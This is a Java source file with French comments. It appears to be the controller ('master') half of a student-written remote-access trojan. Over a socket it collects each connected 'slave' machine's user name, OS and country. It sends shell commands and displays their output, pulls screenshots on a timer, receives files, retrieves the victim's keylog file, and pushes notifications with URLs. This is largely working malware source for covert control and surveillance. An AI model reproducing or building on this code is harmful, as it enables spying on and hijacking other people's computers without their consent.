package master;

import gui.FenetrePrincipal;
import gui.MJInternalFrame;
import gui.MTerminalJInternalFrame;

import java.awt.FlowLayout;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ArrayBlockingQueue;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

import remote.action.ActionVNC;
import remote.action.ScreenShot;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.SendSpecificObject;
import send.specific.object.receivedImage;
import constante.Constante;

public class Connexion {

	/**
	 * Classe qui se charge de l'affichage de l'ecran de l'esclave Permet de
	 * prendre le controle de la souris, et naviguer sur l'ordinateur de
	 * l'esclave * Ne fonctionne pas
	 * 
	 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
	 */

	public static class Affichage extends JFrame {
		private ArrayBlockingQueue<ActionVNC> _remoteActionsQueue;
		private Timer timer;
		private boolean isLaunched;
		private JLabel jlabel;
		private JFrame frame;
		public Affichage() {
			/**
			 * _remoteActionsQueue = new ArrayBlockingQueue<ActionVNC>(20); //
			 * Creer // une // ArrayList // d'arguments
			 * System.out.println("[debug] Affichage: Constructeur");
			 * label.addMouseListener(new MouseAdapter() { // Ajoute un listener
			 * // sur la souris
			 * 
			 * @Override public void mouseClicked(MouseEvent e) { // TODO
			 *           Auto-generated method stub super.mouseClicked(e); } });
			 *           // setSize(Constante.WINDOW_WIDTH,
			 *           Constante.WINDOW_HEIGHT);
			 * 
			 *           Server.log.enregistrerFichier(
			 *           "Ajout d'un listener de la souris");
			 * 
			 *           timer = new Timer(); // Redemmande un screenshot toutes
			 *           les 2 // secondes pour mettre a jour // fenetre
			 *           timer.scheduleAtFixedRate(new TimerTask() {
			 * @Override public void run() { // TODO Auto-generated method stub
			 *           try { _remoteActionsQueue.put(new ScreenShot());
			 *           System.out
			 *           .println("[debug] Affichage: Nouveau Screen ajouter a la queue"
			 *           );
			 * 
			 *           } catch (InterruptedException e) { // TODO
			 *           Auto-generated catch block e.printStackTrace(); } } },
			 *           1, 5000);
			 *           Server.log.enregistrerFichier("Ajout d'un timer");
			 * 
			 *           final Thread envoi = new Thread() { // Des qu'un nouvel
			 *           objer // apparait dans la liste, se // charge de
			 *           l'envoyer
			 * @Override public void run() { while (arret) { try {
			 * 
			 *           if (!_remoteActionsQueue.isEmpty()) { ActionVNC ra =
			 *           _remoteActionsQueue.poll(); _out.writeObject(ra);
			 *           _out.flush(); } System.out .println(
			 *           "[debug] Affichage: Envoit a l'esclave un RemoteAction"
			 *           ); this.sleep(1000); Server.log .enregistrerFichier(
			 *           "Envoi d'une nouvelle requete de RemoteActions"); }
			 *           catch (IOException e) { // TODO Auto-generated catch
			 *           block e.printStackTrace(); } catch
			 *           (InterruptedException e) { // TODO Auto-generated catch
			 *           block e.printStackTrace(); } } } }; envoi.start();
			 * 
			 *           addWindowListener(new WindowAdapter() { public void
			 *           windowClosing(WindowEvent e) {
			 *           System.out.println("Deconnexion"); timer.cancel();
			 * 
			 *           arret = false; _remoteActionsQueue.clear(); } });
			 *           Server.log.enregistrerFichier(
			 *           "Ajout d'un thread pour envoyer"); }
			 * 
			 *           public void setIcon() throws ClassNotFoundException,
			 *           IOException { // Modifie // l'image // de BufferedImage
			 *           img = null; // fond // TODO Auto-generated method stub
			 *           try { System.out.println("trying to read Image"); img =
			 *           ImageIO.read(_in);
			 *           System.out.println("Image Reading successful....."); }
			 *           catch (IOException e) { System.out.println(e); // TODO
			 *           Auto-generated catch block e.printStackTrace(); } File
			 *           save_path = new File(""); save_path.mkdirs(); try {
			 *           ImageIO.write(img, "JPG", new File("img-" +
			 *           System.currentTimeMillis() + ".jpg"));
			 *           System.out.println("Image writing successful......"); }
			 *           catch (IOException e) { // TODO Auto-generated catch
			 *           block System.out.println(e); e.printStackTrace(); }
			 **/
			frame = new JFrame();
			jlabel=new JLabel();
			frame.setVisible(false);
			frame.getContentPane().setLayout(new FlowLayout());
			isLaunched=false;
		}
		public void startTimer(){
			isLaunched=true;
			timer = new Timer();
			timer.scheduleAtFixedRate(new TimerTask() {
			
				public void run() {
					try {
					//	System.out.println("Envoit d'une nouvelle demande");
						_out.writeObject(new ScreenShot());
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}, 1, 5000);
			frame.setVisible(true);
		}
		public void stopTimer()
		{
			timer.cancel();
		}
		public boolean isLaunched() {
			return isLaunched;
		}
		public void readImage() {
			BufferedImage img = null; 
			try {
				img = ImageIO.read(_so.getInputStream());
			} catch (IOException e) {
				System.out.println(e);
				
				e.printStackTrace();
			}
			frame.remove(jlabel);
			frame.getContentPane().add(jlabel=new JLabel(new ImageIcon(img)));
			frame.pack();
	//		frame.setVisible(true);
			frame.repaint();
		}
		
	}

	private static ObjectInputStream _in; // Flux d'entrée
	private static ObjectOutputStream _out; // Flux de sortie // Pour la VNC
	private static String _user_name;

	private Affichage _affichage; // Pour la VNC
	private Compte _compte;
	private String _file_separator;
	private String _ip, _os_name, _numeroConnexion, _pays, _os_arch,
			_os_version;
	private static Socket _so;
	private MTerminalJInternalFrame mCmdJInternalFrame;

	/**
	 * Constructeur
	 * 
	 * @param so
	 *            : le socket ouvert pour l'esclave
	 * @param cp
	 *            le compte auquel appartient la connexion
	 * @throws ClassNotFoundException
	 */
	public Connexion(Socket so, Compte cp) throws ClassNotFoundException {
		super();
		this._so = so;
		try {
			_out = new ObjectOutputStream(_so.getOutputStream()); // Ouvre le
																	// flux

			_in = new ObjectInputStream(new BufferedInputStream( // Ouvre le
																	// flux
					_so.getInputStream()));

			String listInformation = (String) _in.readObject(); // Recupere les
																// parametres de
																// la machine
																// hôte envoyés
																// par l'esclave
			Server.log.enregistrerFichier("\n" + listInformation);

			_compte = cp;
			String[] splited = listInformation.split("\\+\\+"); // Affecte les
																// variables aux
																// parametres de
			_affichage = new Affichage();
			// la classe
			setFile_separator(splited[1]);
			setUser_name(splited[2]);
			setOs_version(splited[3]);
			setOs_name(splited[4]);
			setOs_arch(splited[5]);
			setPays(splited[6]);
			setIp(so.getInetAddress().toString());
			// send(); // Lance un Thread d'envoi
			receive(); // Lance un Thread de reception
		} catch (IOException e) {
			_compte.removeConnection(this);
		}
	}

	public String get_file_separator() {
		return _file_separator;
	}

	public String get_ip() {
		return _ip;
	}

	public String get_numeroConnexion() {
		return _numeroConnexion;
	}

	public String get_os_arch() {
		return _os_arch;
	}

	public String get_os_name() {
		return _os_name;
	}

	public String get_os_version() {
		return _os_version;
	}

	public String get_pays() {
		return _pays;
	}

	public Socket get_so() {
		return _so;
	}

	public String get_user_name() {
		return _user_name;
	}

	public Compte getCompte() {
		return _compte;
	}

	public Socket getSo() {
		return _so;
	}

	private Connexion getThis() {
		return this;
	}

	/**
	 * Methode gérant la reception des objets de l'esclave
	 */
	public void receive() {
		Thread reception = new Thread() {
			@Override
			public void run() {
				try {
					while (true) {

						Object action = _in.readObject(); // Recupere l'objet
						if (action instanceof Integer) { // Si c'est un code
							Integer code = (Integer) action;
							if (code.equals(Constante.code_vnc)) { // ...un code
																	// VNC
								Server.log
										.enregistrerFichier("Recoit une image");
								_affichage.readImage();

							} else if (code.equals(Constante.code_cmd)) { // ...un
																			// code
																			// CMD
								Object object = _in.readObject();
								if (object instanceof String) {
									String res = (String) object; // Recupere la
																	// sortie du
																	// terminal
									// L'affiche
									mCmdJInternalFrame.append(res);
								}
							} else { // Sinon recoit un fichier
										// Appelle la methode receivedFile qui
										// recupere le fichier dans le flux de
										// byte
								Server.log
										.enregistrerFichier("Recoit un fichier");
								ReceivedSpecificObject.receivedFile(
										(Integer) action, _in);
								_compte.getFenetrePrincipale().Addinformation(
										"RECU NOUVEAU FICHIER");
							}
						}

						else {
							Server.log
									.enregistrerFichier("Fichier inconnu par le serveur");
						}

					}
				} catch (IOException e) {
					System.out.println(_ip + " s'est deconnecte"); // Handle
					getThis()._compte.removeConnection(getThis());
				} catch (ClassNotFoundException | InterruptedException e1) {
					e1.printStackTrace();
				}
			}
		};
		reception.start();
	}

	/**
	 * Methode publique qui envoit une commande terminal a un Esclave Est appele
	 * depuis le menu d'Astuces du Maitre
	 * 
	 * @param commande
	 *            : la commande que l'on veut saisir
	 */
	public void sendCmdCommand(String commande) {
		mCmdJInternalFrame = null;
		try {
			_out.writeObject(Constante.code_cmd);

			_out.flush();
			// System.out.println("Envoi d'une requete");
			_out.writeObject(commande);
			_out.flush();
		} catch (IOException e) {
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	/**
	 * Methode publique qui envoit une commande terminal a un Esclave Est appelé
	 * depuis l'interface graphique principale
	 * 
	 * @param commande
	 *            : la commande que l'on veut saisir
	 * @param parent
	 *            : la fenetre parent
	 */
	public void sendCmdCommand(String commande, MTerminalJInternalFrame parent) {
		mCmdJInternalFrame = parent;
		try {
			_out.writeObject(Constante.code_cmd);

			_out.flush();
			_out.writeObject(commande);
			_out.flush();
		} catch (IOException e) {
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	public void sendVNCcommand() {

			if(!_affichage.isLaunched)
				_affichage.startTimer();

	}

	public void sendfile(File file) {
		if (file.canRead() && file.exists())
			try {

				SendSpecificObject
						.sendTxt(file.getName(), file.getPath(), _out);
			} catch (IOException e) {
				_compte.removeConnection(this);
				e.printStackTrace();
			}
	}

	/**
	 * Methode appelé par l'interface graphique et qui se charge de demander a
	 * un esclave son fichier de Keylog
	 */
	public void sendKeylog() {
		Server.log.enregistrerFichier("keylog");
		try {
			_out.writeObject(Constante.code_keylog);
			_out.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/*
	 * Methode appelé par l'interface graphique et qui se charge d'envoyer un
	 * signal de notification a un esclave
	 */
	public void sendNotification(String message, String url) {
		try {
			_out.writeObject(Constante.code_notif);
			_out.flush();
			_out.writeObject(message + "++" + url);
			_out.flush();
		} catch (IOException e) {
			_compte.removeConnection(this);
			e.printStackTrace();
		}
	}

	private void setFile_separator(String file_separator) {
		this._file_separator = file_separator;
	}

	private void setIp(String ip) {
		this._ip = ip;
	}

	private void setOs_arch(String os_arch) {
		this._os_arch = os_arch;
	}

	private void setOs_name(String os_name) {
		this._os_name = os_name;
	}

	private void setOs_version(String os_version) {
		this._os_version = os_version;
	}

	private void setPays(String pays) {
		this._pays = pays;
	}

	private void setUser_name(String user_name) {
		this._user_name = user_name;
	}

	
}
